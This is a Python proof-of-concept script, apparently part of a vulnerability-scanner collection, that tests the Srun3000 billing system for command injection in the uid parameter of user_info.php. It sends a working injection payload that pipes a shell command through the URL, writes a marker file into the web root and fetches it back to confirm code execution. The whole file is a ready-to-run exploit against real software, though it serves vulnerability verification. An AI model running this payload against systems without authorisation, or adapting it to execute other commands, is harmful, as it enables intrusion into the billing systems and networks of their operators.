#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 深澜软件srun3000计费系统user_info.php命令执行
referer: http://www.wooyun.org/bugs/WooYun-2014-52191
author: Lucifer
description: 文件user_info.php中,get参数uid存在命令执行漏洞。
'''
import sys
import requests
import warnings
from termcolor import cprint

class srun_user_info_uid_rce_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = '/user_info.php?uid=1|echo "81dc9bdb52d04dc20036dbd8313ed055">/srun3/web/hit.txt'
        vulnurl = self.url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            shellurl = self.url + "/hit.txt"
            req2 = requests.get(shellurl, headers=headers, timeout=10, verify=False)
            if r"81dc9bdb52d04dc20036dbd8313ed055" in req2.text:
                cprint("[+]存在深澜软件srun3000计费系统user_info.php命令执行漏洞...(高危)\tpayload: "+vulnurl+"\nshellurl: "+shellurl, "red")

        except:
            cprint("[-] "+__file__+"====>连接超时", "cyan")

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = srun_user_info_uid_rce_BaseVerify(sys.argv[1])
    testVuln.run()